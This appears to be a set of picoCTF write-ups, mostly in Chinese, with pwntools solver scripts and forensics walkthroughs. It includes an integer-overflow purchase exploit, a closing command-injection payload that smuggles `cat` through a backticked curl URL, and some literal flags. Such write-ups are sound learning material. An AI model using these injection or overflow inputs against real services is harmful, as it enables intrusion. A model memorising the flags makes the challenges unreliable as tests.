## General Skills

### Nice netcat...

```python
#!/usr/bin/python3       
     
from pwn import *        
     
r = remote('mercury.picoctf.net', 7449)  
     
while True:    
    try:
        a = r.recvline().replace(b'\n ', b'')
        print(chr(int(a)), end='')
    except EOFError:                                                                                                                                                         
        r.close()        
        break
```

### Based

```python
#!/usr/bin/python3

from pwn import *

# 是否可印
# string built-in printable() 會超出範圍，不準
def isprintable(s):
    for ss in s:
        if ord(ss) < 20 or ord(ss) > 124:
            return False
    return True

# 一樣，built-in isnumeric() 只有判斷是否是 0-9
# 但這邊會出現 hex
def isnumeric(s):
    s = s.encode()
    for i in s:
        i = bytes([i])
        if (not (i >= b'0' and i <= b'9')) and (not (i >= b'a' and i <= b'f')):
            return False
    if s == b'':
        return False
    return True
         
def dc(data):
    data = [i for i in data if isnumeric(i)]
    bases = [2, 8, 10, 16]
	
    # 先嘗試用 space 的 case，如 [34, 38]
    for base in bases:
        out = ""
        for i in data:
            try:
                dd = int(i, base)
                if dd > 20:
                    out += chr(dd)
            except:
                out += '\x01'
                break
         
        if out and isprintable(out):
            return out

    # 再試連續的 case，如 "3f48"
    data = data[-1]
    bases = {2: 8, 8: 3, 16: 2}

    for k, v in bases.items():
        # zero padding
        d = '0' * (v - (len(data) % v)) + data
        out = ""
        for i in range(0, len(d), v):
            try:
                dd = int(d[i:i+v], k)
                if dd > 20:
                    out += chr(dd)
            except:
                out += '\x01' # 加上 unprintable，讓迴圈 continue
                break
         
        if out and isprintable(out):
            return out
         
r = remote('jupiter.challenges.picoctf.org', 29221)
while True:
    try: 
        r.recvuntil('Please ')
        data = r.recvuntil(' as a word', drop=True).lstrip(b' ').split(b' ')[2:]
        data = list(map(lambda a: (a.decode('utf-8')), data))
        data = dc(data)
        r.sendlineafter('Input:', data)
    except:
        r.close()
        break
```

### plumbing

```python
#!/usr/bin/python3       
from pwn import *        
import re                
                         
r = remote('jupiter.challenges.picoctf.org', 7480)
                         
data = r.recvall(timeout=1)   
result = re.search("(picoCTF{.*})", data.decode('utf-8'))
                         
if result:               
    print(result.group(0))                                                                                                        
r.close()
```

### mus1c

`https://codewithrockstar.com/online`

### flag_shop

```python
#!/usr/bin/python3         
from pwn import *          
              
r = remote('jupiter.challenges.picoctf.org', 4906)
              
r.sendlineafter('2. Buy Flags', '2')      
r.sendlineafter('1. Defintely not the flag Flag', '1')
r.sendlineafter('enter desired quantity', str( ((2**31 + 1100) // 900) + 1 ) ) # overflow
r.sendlineafter('2. Buy Flags', '2')      
r.sendlineafter('2. 1337 Flag', '2')      
r.sendlineafter('Enter 1 to buy one', '1')
r.recvuntil("YOUR FLAG IS: ")
flag = r.recvline()[:-1]   
print(flag.decode('utf-8'))
r.close()  
```

### 1_wanna_b3_a_r0ck5tar

```
(Simple variables, true)
Rocknroll is right

(Simple variables, false)
Silence is wrong                

(Common variables, a guitar, 10)
A guitar is a six-string        

Tommy's been down               

(Proper variables, 170)
Music is a billboard-burning razzmatazz!

(input music)
Listen to the music             

(input == 10)
If the music is a guitar                  
Say "Keep on rocking!"                

(input rhythm)
Listen to the rhythm

(rhythm - Music == 0)
If the rhythm without Music is nothing
(Tommy == 66)
Tommy is rockin guitar
Shout Tommy!                    

Music is amazing sensation 
Jamming is awesome presence
(Music == 79)
Scream Music!
(Jamming == 78)
Scream Jamming!                 
Tommy is playing rock           
Scream Tommy!       
They are dazzled audiences                  
Shout it!
Rock is electric heaven                     
Scream it!
Tommy is jukebox god            
Say it!                                     
Break it down
Shout "Bring on the rock!"

```

`input: 10, 170`

## Forensics

### information

可以在圖檔內容前面加上 RDF (Resource Description Framework) 來描述圖片，並且使用 `exiftool` 來取得資訊

`exiftool cat.jpg`

### Matryoshka doll

題目名稱 Matryoshka doll 有 recursive，因為一個俄羅斯娃娃內部還會有一個俄羅斯娃娃。而這題使用指另 `unzip`，`unzip` 會去找檔案中是否含有 zip 檔案格式的內容，如果有就 extract 出來。

```python
#!/usr/bin/python3  
                    
import subprocess   
import os           
                    
name = 'dolls.png'  
cnt = 1             
                    
os.chdir("base_images")
                    
while True:         
    cmd = f'unzip -o {name} -d /tmp/tmp'.split(' ')
    
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
                    
    if b'cannot find zipfile' in err or b'cannot find or open' in err:
        print("done")
        break       
                    
    print(out)      
    print(err)      
    cnt += 1        
    name = f"{cnt}_c.jpg"
```

### tunn3l v1s10n

Exiftool dump：

```
ExifTool Version Number         : 11.88
File Name                       : tunn3l_v1s10n
Directory                       : .
File Size                       : 2.8 MB
File Modification Date/Time     : 2021:03:16 02:24:47+08:00
File Access Date/Time           : 2021:06:30 02:16:32+08:00
File Inode Change Date/Time     : 2021:06:30 02:15:48+08:00
File Permissions                : rw-rw-r--
File Type                       : BMP
File Type Extension             : bmp
MIME Type                       : image/bmp
BMP Version                     : Unknown (53434)
Image Width                     : 1134
Image Height                    : 306
Planes                          : 1
Bit Depth                       : 24
Compression                     : None
Image Length                    : 2893400
Pixels Per Meter X              : 5669
Pixels Per Meter Y              : 5669
Num Colors                      : Use BitDepth
Num Important Colors            : All
Red Mask                        : 0x27171a23
Green Mask                      : 0x20291b1e
Blue Mask                       : 0x1e212a1d
Alpha Mask                      : 0x311a1d26
Color Space                     : Unknown (,5%()
Rendering Intent                : Unknown (826103054)
Image Size                      : 1134x306
Megapixels                      : 0.347
```



按照 [BMP 格式](http://www.ece.ualberta.ca/~elliott/ee552/studentAppNotes/2003_w/misc/bmp_file_format/bmp_file_format.htm) 與網路上隨意抓的 BMP 圖檔來修改此 corrupt bmp。

```
ExifTool Version Number         : 11.88
File Name                       : tunn3l_v1s10n.bmp
Directory                       : .
File Size                       : 2.8 MB
File Modification Date/Time     : 2021:06:30 02:27:34+08:00
File Access Date/Time           : 2021:06:30 03:26:28+08:00
File Inode Change Date/Time     : 2021:06:30 03:26:26+08:00
File Permissions                : rwxrw-rw-
File Type                       : BMP
File Type Extension             : bmp
MIME Type                       : image/bmp
BMP Version                     : Windows V3
Image Width                     : 1134
Image Height                    : 306
Planes                          : 1
Bit Depth                       : 24
Compression                     : None
Image Length                    : 0
Pixels Per Meter X              : 5669
Pixels Per Meter Y              : 5669
Num Colors                      : 16777216
Num Important Colors            : All
Red Mask                        : 0x00ff0000
Green Mask                      : 0x0000ff00
Blue Mask                       : 0x000000ff
Alpha Mask                      : 0xff000000
Color Space                     : sRGB
Rendering Intent                : Picture (LCS_GM_IMAGES)
Image Size                      : 1134x306
Megapixels                      : 0.347
```



修好的 bmp 會顯示 `noaflag` 的字串，但是能發現在邊邊會有類似的圖案，因此我認為這整張圖是一個很寬的圖片，由於某些關係只會顯示 offset + length 的圖片，如果要顯示更多，就需要調整 offset 或是長寬，而長寬因為當時同時開啟 hex editor 以及圖片時，圖片會跑掉，因此我決定從 offset 著手。起初的 offset 為 `0xd0ba`，透過測試，會在 offset 為 `0x1bb98a` 時看到 flag。

之後看到其他作法才知道 bmp 長寬並非不包含整個圖片的資料，可以從圖片長寬 `1334*306` 但卻有 `2893454 bytes` 觀察得到，因此直接調整 header 的長寬部分即可。

### Wireshark doo dooo do doo...

打開 wireshark 載入封包後，使用 export object -> HTTP，會看到許多相同的以及一個不一樣的 response，取得該 response 後做 rot13 即是 flag。

### MacroHard WeakEdge

ppt 相關格式都可以作為 zip 檔來解壓縮，並可以得到 ppt 中使用到的影片、相片、物件的完整檔案。而此題解壓縮過後，在 `slideMasters` 下存放 `hidden`，即是 base64 後的檔案。

`grep -rn <path> -e "pattern"` 可以 recursively traverse 目錄下的所有檔案與資料夾，並且查看檔案內容是否符合 pattern。

### Trivial Flag Transfer Protocol

因為 tftp 沒有加密，所以可以直接看到傳輸資料，不過資料是以許多 block 所組成，每次只會送一個 block，因此需要將所有 block 組回。

第一次 tftp 傳送了 `instructions.txt`、`plan`，看起來都被做過加密或是隱寫之類的行為，不過沒有太多資訊。

第二次 tftp 傳送了 `program.deb` 以及三張 bmp 圖片，deb 為經過壓縮的軟體，內有軟體本身以及相關 metadata。



把這些資料 dump 出來的方式可以直接用 wireshark 的 export object，也可以直接用 `tshark`，像是：

`tshark -r ./tftp.pcapng -T fields -e data "udp.stream eq 10" | xxd -r -p > output`

- `xxd`
  - `-r`: hex to binary
  - `-p`: ignore newline info
- `tshark`
  - `-r`: read file
  - `-T`: decoded data format
  - `-e`: add a field to display
    - fields 清單可以參考[官方文件](https://www.wireshark.org/docs/dfref/)
  - `udp.stream eq 10`: wireshark filter

透過 `tar xvf program.deb` 解開後可以知道執行檔為 `steghide`，這個工具可以將 secret 隱寫在其他資料內。

在經過多次嘗試，發現 `instructions.txt` 與 `plan` 可以使用 `rot13` 轉成看得懂的文字，分別如下：

plan: `IUSEDTHEPROGRAMANDHIDITWITH-DUEDILIGENCE.CHECKOUTTHEPHOTOS` => `I USED THE PROGRAM AND HID IT WITH-DUEDILIGENCE. CHECK OUT THE PHOTOS`

instructions: `TFTPDOESNTENCRYPTOURTRAFFICSOWEMUSTDISGUISEOURFLAGTRANSFER.FIGUREOUTAWAYTOHIDETHEFLAGANDIWILLCHECKBACKFORTHEPLAN` => `TFTP DOESNT ENCRYPT OUR TRAFFIC SO WE MUST DISGUISE OUR FLAG TRANSFER. FIGURE OUT AWAY TO HIDE THE FLAG AND I WILL CHECK BACK FOR THE PLAN`

用 binwalk 掃了一次發現 picture2.bmp 特別奇怪，猜測內容有被做過隱寫，嘗試使用 `stegcracker` 來 bruteforce `steghide`，不過沒什麼效果，之後看到 `plan` 中有一段 `...WITH-DUEDILIGENCE...`，所以用 `DUEDILIGENCE` 嘗試解密，成功解出 flag.txt。

### Wireshark twoo twooo two twoo...

查看封包 protocol hierarchy

`tshark -qz io,phs -r ./shark2.pcapng`

- `-z io,phs`: Create Protocol Hierarchy Statistics listing both number of packets and bytes



查看包含特定字串的封包

`tshark -nr ./shark2.pcapng -Y "frame contains picoCTF" -T fields -e text`

- `-n`: Disable network object name resolution，直接顯示 IP
- `-Y "frame containes XXX"`: 找出 frame 中包含 XXX 字串的  packet



仔細觀察後會發現 DNS subdomain 的 prefix 看起來像是 bas64 的一部分，因此過濾 DNS query 後取出 prefix: `tshark -nr ./shark2.pcapng -T fields -e dns.qry.name 'udp.dstport == 53' > log`，並用 base64 decode 後，會發現大部分的 decoded text 長得很醜，不像是正確的資料，也有部分資料呈現明文，並且看起來像是 flag 的形式。觀察 DNS dst ip，大部分是送往 `8.8.8.8`，但是有些是送到 `18.217.1.57`，因此可以猜測明文的部分為送給 `18.217.1.57` 的請求: `tshark -nr ./shark2.pcapng -T fields -e dns.qry.name 'udp.dstport == 53 and ip.dst == 18.217.1.57' > log`。

最後用 python 將資料組合後 base64 decode 即是 flag。	

```python
#!/usr/bin/python3                                   
                                                     
import re                                            
import base64                                        
                                                      
with open('log', 'r') as f:                          
    datas = f.read().split('\n')                     
    pattern = re.compile("(.*).reddshrimpandherring(.*)")
    b64list = []
    
    for data in datas:                               
        res = pattern.search(data)                   
                                                     
        if res and res.group(1) not in b64list:      
            b64list.append(res.group(1))             
            if '=' in res.group(1):                  
                fullb64 = ''.join(b64list)           
                b64list.clear()                      
                val = base64.b64decode(fullb64)      
                for v in val:                        
                    if v >= 20 and v <= 127:         
                        print(chr(v), end='')        
                print()
```

### Disk, disk, sleuth!

會得到一個 boot sector `DOS/MBR boot sector; partition 1 : ID=0x83, active, start-CHS (0x0,32,33), end-CHS (0x10,81,1), startsector 2048, 260096 sectors`，而題目要求你使用 `srch_strings` 去看此 disk image 有什麼內容，而直接搜尋 picoCTF 後就會找到 flag。

`srch_strings` 屬於 The Sleuth Kit，輸出基本上跟 `strings` 相同，不過有 flag (`-td`) 可以讓 offset 一併輸出 。

這題如果直接用 qemu 跑起來 (`qemu-system-x86_64 -drive format=raw,file=dds1-alpine.flag.img`) 是沒辦法的，因為他會需要輸入帳號密碼，不過題目沒有提供。

### Disk, disk, sleuth! II

直接用 qemu 跑起來後，登入帳號密碼為 root/root，就可以看到 down-at-the-bottom.txt。

`picoCTF{f0r3ns1c4t0r_n0v1c3_ff27f139}`

### What Lies Within

使用[這個工具](https://stylesuxx.github.io/steganography/)來 decode 即可。

### shark on wire 1

可以看到 udp 有奇怪的 payload，而可以透過 follow packet + **更改 stream** 來看不同 stream 的資料，最後會在 stream 6 找到 flag。

### advanced-potion-making

從 `strings` 的結果有 IHDR、IDAT、IEND 字串就可以得知此檔案為 png，不過因為損毀所以 `file` 辨識不出來，而[此文章](https://stackoverflow.com/questions/54845745/not-able-to-read-ihdr-chunk-of-a-png-file)有對 png file format 做一些介紹，而[此篇](https://www.w3.org/TR/PNG-Structure.html)為文件。

有幾個要修復的地方:

1. PNG magic: `42 41` -> `4E 47`
2. IHDR length:  `00 12 13 14` -> `00 00 00 0D`

之後會得到一張全紅的圖，用 stegsolve.jar 轉到 red 0 就會有 flag。

### Milkslap

此動畫是將每個 frame 組成一張圖片，並透過 javascript 做位移達到連續畫面的效果，而在得到原圖 `concat_v.png` 後，用 [zsteg](https://github.com/zed-0xff/zsteg) 分析就能找到 flag 以 `b1,b,lsb,xy` 的方式藏在圖片中。

`b1,b,lsb,xy` 也可以使用 stegsolve.jar 的 data extract 來分析:

Bit Planes - Blue 0 -> LSB First -> Row -> RGB

## Web

### GET aHEAD

題目名稱明顯要我們送出一個 HEAD request，因此 `curl -i -X HEAD http://mercury.picoctf.net:45028/` 即可拿到 flag `picoCTF{r3j3ct_th3_du4l1ty_775f2530}`。

- HEAD: `HEAD` 方法請求與 `GET` 方法相同的回應，但它沒有回應主體（response body）

### caas

command injection: 

```bash
curl https://caas.mars.picoctf.net/cowsay/`cat falg.txt`
```

